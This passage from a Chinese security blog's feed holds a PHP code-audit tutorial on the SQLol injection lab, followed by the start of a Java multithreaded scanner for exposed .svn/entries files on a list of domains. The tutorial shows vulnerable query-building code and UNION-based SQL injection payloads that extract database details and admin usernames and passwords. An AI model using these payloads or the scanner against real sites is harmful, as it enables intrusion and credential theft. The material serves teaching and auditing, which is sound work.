+                &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$blacklist&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;){
+                    &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] = str_replace(strtolower(&lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;), &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, strtolower(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;]), &lt;span class=&quot;variable&quot;&gt;$count&lt;/span&gt;);
+                    &lt;span class=&quot;variable&quot;&gt;$keyword_found&lt;/span&gt; += &lt;span class=&quot;variable&quot;&gt;$count&lt;/span&gt;;
+                }    
+            }&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$keyword_found&lt;/span&gt;);
+            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+
+    }
+}
+}
+
+&lt;span class=&quot;preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.我们再返回到select.php，发现后面也有个submit后表单处理程序，判断要注射的位置并构造sql语句，跟进看下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(isset($_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;submit&#39;&lt;/span&gt;])){ //submit后，进入处理程序之二，&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;在上面
+
+if($_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;location&#39;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;entire_query&#39;&lt;/span&gt;){//判断是不是整条语句都要注入，这里方便学习可以忽略不管
+
+    &lt;span class=&quot;variable&quot;&gt;$query&lt;/span&gt; = $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;];
+    if(isset($_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;show_query&#39;&lt;/span&gt;]) and $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;show_query&#39;&lt;/span&gt;]==&lt;span class=&quot;string&quot;&gt;&#39;on&#39;&lt;/span&gt;) &lt;span class=&quot;variable&quot;&gt;$displayquery&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;u&amp;gt;&#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/u&amp;gt;&#39;&lt;/span&gt;;
+
+} else { //这里是根据你选择要注射的位置来构造sql语句
+
+    &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_column_name = &lt;span class=&quot;variable&quot;&gt;$column&lt;/span&gt;_name = &lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;;
+    &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_table_name = &lt;span class=&quot;variable&quot;&gt;$table&lt;/span&gt;_name = &lt;span class=&quot;string&quot;&gt;&#39;users&#39;&lt;/span&gt;;
+    &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_where_clause = &lt;span class=&quot;variable&quot;&gt;$where&lt;/span&gt;_clause = &lt;span class=&quot;string&quot;&gt;&#39;WHERE isadmin = 0&#39;&lt;/span&gt;;
+    &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_group_by_clause = &lt;span class=&quot;variable&quot;&gt;$group&lt;/span&gt;_by_clause = &lt;span class=&quot;string&quot;&gt;&#39;GROUP BY username&#39;&lt;/span&gt;;
+    &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_order_by_clause = &lt;span class=&quot;variable&quot;&gt;$order&lt;/span&gt;_by_clause = &lt;span class=&quot;string&quot;&gt;&#39;ORDER BY username ASC&#39;&lt;/span&gt;;
+    &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_having_clause = &lt;span class=&quot;variable&quot;&gt;$having&lt;/span&gt;_clause = &lt;span class=&quot;string&quot;&gt;&#39;HAVING 1 = 1&#39;&lt;/span&gt;;
+
+    switch ($_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;location&#39;&lt;/span&gt;]){
+        case &lt;span class=&quot;string&quot;&gt;&#39;column_name&#39;&lt;/span&gt;:
+            &lt;span class=&quot;variable&quot;&gt;$column&lt;/span&gt;_name = $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;];
+            &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_column_name = &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;u&amp;gt;&#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/u&amp;gt;&#39;&lt;/span&gt;;
+            break;
+        case &lt;span class=&quot;string&quot;&gt;&#39;table_name&#39;&lt;/span&gt;:
+            &lt;span class=&quot;variable&quot;&gt;$table&lt;/span&gt;_name = $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;];
+            &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_table_name = &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;u&amp;gt;&#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/u&amp;gt;&#39;&lt;/span&gt;;
+            break;
+        case &lt;span class=&quot;string&quot;&gt;&#39;where_string&#39;&lt;/span&gt;:
+            &lt;span class=&quot;variable&quot;&gt;$where&lt;/span&gt;_clause = &lt;span class=&quot;string&quot;&gt;&quot;WHERE username = &#39;&quot;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&quot;&#39;&quot;&lt;/span&gt;;
+            &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_where_clause = &lt;span class=&quot;string&quot;&gt;&quot;WHERE username = &#39;&quot;&lt;/span&gt; . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;u&amp;gt;&#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/u&amp;gt;&#39;&lt;/span&gt; . &lt;span class=&quot;string&quot;&gt;&quot;&#39;&quot;&lt;/span&gt;;
+            break;
+        case &lt;span class=&quot;string&quot;&gt;&#39;where_int&#39;&lt;/span&gt;:
+            &lt;span class=&quot;variable&quot;&gt;$where&lt;/span&gt;_clause = &lt;span class=&quot;string&quot;&gt;&#39;WHERE isadmin = &#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;];
+            &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_where_clause = &lt;span class=&quot;string&quot;&gt;&#39;WHERE isadmin = &#39;&lt;/span&gt; . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;u&amp;gt;&#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/u&amp;gt;&#39;&lt;/span&gt;;
+            break;
+        case &lt;span class=&quot;string&quot;&gt;&#39;group_by&#39;&lt;/span&gt;:
+            &lt;span class=&quot;variable&quot;&gt;$group&lt;/span&gt;_by_clause = &lt;span class=&quot;string&quot;&gt;&#39;GROUP BY &#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;];
+            &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_group_by_clause = &lt;span class=&quot;string&quot;&gt;&#39;GROUP BY &#39;&lt;/span&gt; . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;u&amp;gt;&#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/u&amp;gt;&#39;&lt;/span&gt;;
+            break;
+        case &lt;span class=&quot;string&quot;&gt;&#39;order_by&#39;&lt;/span&gt;:
+            &lt;span class=&quot;variable&quot;&gt;$order&lt;/span&gt;_by_clause = &lt;span class=&quot;string&quot;&gt;&#39;ORDER BY &#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39; ASC&#39;&lt;/span&gt;;
+            &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_order_by_clause = &lt;span class=&quot;string&quot;&gt;&#39;ORDER BY &#39;&lt;/span&gt; . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;u&amp;gt;&#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/u&amp;gt;&#39;&lt;/span&gt; . &lt;span class=&quot;string&quot;&gt;&#39; ASC&#39;&lt;/span&gt;;
+            break;
+        case &lt;span class=&quot;string&quot;&gt;&#39;having&#39;&lt;/span&gt;:
+            &lt;span class=&quot;variable&quot;&gt;$having&lt;/span&gt;_clause = &lt;span class=&quot;string&quot;&gt;&#39;HAVING isadmin = &#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;];
+            &lt;span class=&quot;variable&quot;&gt;$display&lt;/span&gt;_having_clause = &lt;span class=&quot;string&quot;&gt;&#39;HAVING isadmin = &#39;&lt;/span&gt; . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;u&amp;gt;&#39;&lt;/span&gt; . $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/u&amp;gt;&#39;&lt;/span&gt;;
+            break;
+    }
+
+    &lt;span class=&quot;variable&quot;&gt;$query&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;SELECT $column_name FROM $table_name $where_clause $group_by_clause $order_by_clause &quot;&lt;/span&gt;;
+    /*Probably a better way to create &lt;span class=&quot;variable&quot;&gt;$displayquery&lt;/span&gt;...
+    This allows me to underline the injection string
+    in the resulting query that&lt;span class=&quot;string&quot;&gt;&#39;s displayed with the
+    &quot;Show Query&quot; option without munging the query
+    which hits the database.*/
+    $displayquery = &quot;SELECT $display_column_name FROM $display_table_name $display_where_clause $display_group_by_clause $display_order_by_clause &quot;;
+
+}
+
+include(&#39;&lt;/span&gt;includes/database.inc.php&lt;span class=&quot;string&quot;&gt;&#39;);//这里又引入了一个包，我们继续跟进看看
+
+}
+?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.跟进database.inc.php，终于带入查询了，所以表单看懂了，整个过程就没过滤^ ^&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;variable&quot;&gt;$db&lt;/span&gt;_conn = NewADOConnection(&lt;span class=&quot;variable&quot;&gt;$dsn&lt;/span&gt;);
+
+print(&lt;span class=&quot;string&quot;&gt;&quot;\n&amp;lt;br&amp;gt;\n&amp;lt;br&amp;gt;&quot;&lt;/span&gt;);
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(isset($_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;show_query&#39;&lt;/span&gt;]) and $_REQUEST[&lt;span class=&quot;string&quot;&gt;&#39;show_query&#39;&lt;/span&gt;]==&lt;span class=&quot;string&quot;&gt;&#39;on&#39;&lt;/span&gt;) echo &lt;span class=&quot;string&quot;&gt;&quot;Query (injection string is &amp;lt;u&amp;gt;underlined&amp;lt;/u&amp;gt;): &quot;&lt;/span&gt; . &lt;span class=&quot;variable&quot;&gt;$displayquery&lt;/span&gt; . &lt;span class=&quot;string&quot;&gt;&quot;\n&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;
+
+&lt;span class=&quot;variable&quot;&gt;$db&lt;/span&gt;_conn-&amp;gt;SetFetchMode(ADODB_FETCH_ASSOC);
+&lt;span class=&quot;variable&quot;&gt;$results&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$db&lt;/span&gt;_conn-&amp;gt;Execute(&lt;span class=&quot;variable&quot;&gt;$query&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x04_漏洞证明&quot;&gt;0x04 漏洞证明&lt;/h2&gt;&lt;p&gt;1.有了注入点了，我们先随意输入1然后选择注射位置为Where子句里的数字，开启Seay的MySql日志监控：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sqlol3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;2.SQL查询语句为：SELECT username FROM users WHERE isadmin = 1 GROUP BY username ORDER BY username ASC&lt;br&gt;根据MySql日志监控里获取的sql语句判断可输出的只有一个字段，然后我们构造POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;222333&lt;/span&gt;&lt;span class=&quot;preprocessor&quot;&gt;# &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找到输出点“222333”的位置如下图：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sqlol4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;3.构造获取数据库相关信息的POC:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; union select &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(database()&lt;/span&gt;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x5c,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x5c,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;)#
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取数据库名（sqlol）、账户名（root@localhost）和数据库版本(5.6.12)如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sqlol5.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;4.构造获取数据库sqlol中所有表信息的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;title&quot;&gt;GROUP_CONCAT&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(DISTINCT table_name)&lt;/span&gt; from information_schema.tables where table_schema&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;0x73716C6F6C&lt;/span&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取数据库sqlol所有表信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sqlol6.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;5.构造获取admin表所有字段信息的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;title&quot;&gt;GROUP_CONCAT&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(DISTINCT column_name)&lt;/span&gt; from information_schema.columns where table_name&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;0x61646D696E&lt;/span&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取表admin所有字段信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sqlol7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;6.构造获取admin表账户密码的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-1 union &lt;span class=&quot;operator&quot;&gt;select &lt;span class=&quot;keyword&quot;&gt;GROUP_CONCAT&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;DISTINCT&lt;/span&gt; username,&lt;span class=&quot;number&quot;&gt;0x5f&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;password&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;admin&lt;/span&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取管理员的账户密码信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sqlol8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;本文由HackBraid整理总结，如需转载请联系作者。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;首先恭喜Seay法师的力作《代码审计：企业级web代码安全架构》，读了两天后深有感触。想了想自己也做审计有2年了，决定写个PHP代码审计实例教程的系列，希望能够帮助到新人更好的了解这一领域，同时也作为自己的一种沉淀。大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="WEB安全" scheme="http://hackbraid.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="PHP" scheme="http://hackbraid.github.io/tags/PHP/"/>
+    
+      <category term="SQL注入" scheme="http://hackbraid.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="代码审计" scheme="http://hackbraid.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Java基于queue的多线程提取SVN信息泄露程序</title>
+    <link href="http://hackbraid.github.io/2015/12/16/svnExtract/"/>
+    <id>http://hackbraid.github.io/2015/12/16/svnExtract/</id>
+    <published>2015-12-16T09:35:00.000Z</published>
+    <updated>2015-12-17T07:56:18.774Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;引上一篇博文，对于多线程程序来说，不管任何编程语言，生产者和消费者模型都是最经典的。就像学习每一门编程语言你首先要输出Hello World一样，都是经典的例子。这里使用queue队列作为仓储，将生产者和消费者联系起来并模拟实现一个多线程提取SVN信息泄露漏洞的程序。&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/svn.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02_基于Queue的多线程提取SVN信息泄露的实现&quot;&gt;0x02 基于Queue的多线程提取SVN信息泄露的实现&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.io.BufferedReader;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.io.InputStream;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.io.InputStreamReader;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.net.HttpURLConnection;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.net.URL;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.net.URLConnection;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.util.ArrayList;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.util.List;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.util.concurrent.BlockingQueue;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.util.concurrent.LinkedBlockingQueue;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; ReadFiles.ReadFromFile;
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; WriteFiles.WriteToFile;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * 
+ * ClassName: svnExtract 
+ * &lt;span class=&quot;doctag&quot;&gt;@Description&lt;/span&gt; 获取域名list中存在svn信息泄露的域名
+ * &lt;span class=&quot;doctag&quot;&gt;@author&lt;/span&gt; HackBraid
+ * &lt;span class=&quot;doctag&quot;&gt;@date&lt;/span&gt; 2015年11月4日
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;svnExtract&lt;/span&gt; {&lt;/span&gt;
+
+&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; BlockingQueue&amp;lt;String&amp;gt; svnQueue = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; LinkedBlockingQueue&amp;lt;String&amp;gt;();
+&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;typename&quot;&gt;void&lt;/span&gt; main(String[] args) {
+    &lt;span class=&quot;comment&quot;&gt;// TODO Auto-generated method stub&lt;/span&gt;
+    svnExtract svnExtract=&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; svnExtract();
+    &lt;span class=&quot;typename&quot;&gt;long&lt;/span&gt; startTime=System.currentTimeMillis(); 
+    svnExtract.svnProducer(svnQueue, &lt;span class=&quot;string&quot;&gt;&quot;C:/Users/Administrator/Desktop/domain.txt&quot;&lt;/span&gt;);
+    &lt;span class=&quot;typename&quot;&gt;long&lt;/span&gt; nextTime=System.currentTimeMillis(); 
+    System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;生成svnQueue队列的运行时间： &quot;&lt;/span&gt;+(nextTime-startTime)+&lt;span class=&quot;string&quot;&gt;&quot;ms&quot;&lt;/span&gt;);
+    ThreadGroup tg=&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ThreadGroup(&lt;span class=&quot;string&quot;&gt;&quot;svnExtract&quot;&lt;/span&gt;);
+    svnConsumer svnConsumer=svnExtract.&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; svnConsumer();
+    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;; i++) {
+        Thread thread=&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Thread(tg,svnConsumer);
+        thread.start();
+    }
+    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;) {
+        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(tg.activeCount()==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;){
+            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+        }
+    }
+    &lt;span class=&quot;typename&quot;&gt;long&lt;/span&gt; endTime=System.currentTimeMillis(); 
+    System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;程序总运行时间： &quot;&lt;/span&gt;+(endTime-startTime)+&lt;span class=&quot;string&quot;&gt;&quot;ms&quot;&lt;/span&gt;);
+}
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * 
+ * &lt;span class=&quot;doctag&quot;&gt;@Description&lt;/span&gt; 根据文件路径将文件里的url填充到svnQueue中
+ * &lt;span class=&quot;doctag&quot;&gt;@param&lt;/span&gt; svnQueue
+ * &lt;span class=&quot;doctag&quot;&gt;@param&lt;/span&gt; filePath
+ * &lt;span class=&quot;doctag&quot;&gt;@return&lt;/span&gt; svnQueue 
+ * &lt;span class=&quot;doctag&quot;&gt;@author&lt;/span&gt; HackBraid
+ * &lt;span class=&quot;doctag&quot;&gt;@date&lt;/span&gt; 2015年11月4日
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; BlockingQueue&amp;lt;String&amp;gt; svnProducer(BlockingQueue&amp;lt;String&amp;gt; svnQueue, String filePath) {
+    String urlTmp;
+    ReadFromFile readFromFile = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ReadFromFile();
+    List urlList = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;String&amp;gt;();
+    urlList = readFromFile.readFileByLines(filePath);
+    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; urlList.size(); i++) {
+        urlTmp=&lt;span class=&quot;string&quot;&gt;&quot;http://&quot;&lt;/span&gt;+urlList.get(i)+&lt;span class=&quot;string&quot;&gt;&quot;/.svn/entries&quot;&lt;/span&gt;;
+        svnQueue.offer(urlTmp);
+    }
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; svnQueue;
+
+}
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * 
+ * ClassName: svnConsumer 
+ * &lt;span class=&quot;doctag&quot;&gt;@Description&lt;/span&gt; 处理svnQueue中的url，判断是否存在svn信息泄露
+ * &lt;span class=&quot;doctag&quot;&gt;@author&lt;/span&gt; HackBraid
+ * &lt;span class=&quot;doctag&quot;&gt;@date&lt;/span&gt; 2015年11月4日
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;svnConsumer&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Runnable&lt;/span&gt;{&lt;/span&gt;
+
+    &lt;span class=&quot;annotation&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;typename&quot;&gt;void&lt;/span&gt; run() {
+        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;) {
+            String url=svnQueue.poll();
+            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(url == &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;){
+                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;
+            }
+            &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;{
+            URL u = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; URL(url);
+            URLConnection connection = u.openConnection();
+            HttpURLConnection httpURLConnection = (HttpURLConnection) connection;
+            httpURLConnection.setRequestProperty(&lt;span class=&quot;string&quot;&gt;&quot;Accept-Charset&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;);
+            httpURLConnection.setRequestProperty(&lt;span class=&quot;string&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;identity&quot;&lt;/span&gt;);
+            httpURLConnection.setRequestProperty(&lt;span class=&quot;string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;,
+                    &lt;span class=&quot;string&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;);
+            httpURLConnection.setReadTimeout(&lt;span class=&quot;number&quot;&gt;2000&lt;/span&gt;);
+            httpURLConnection.setConnectTimeout(&lt;span class=&quot;number&quot;&gt;2000&lt;/span&gt;);
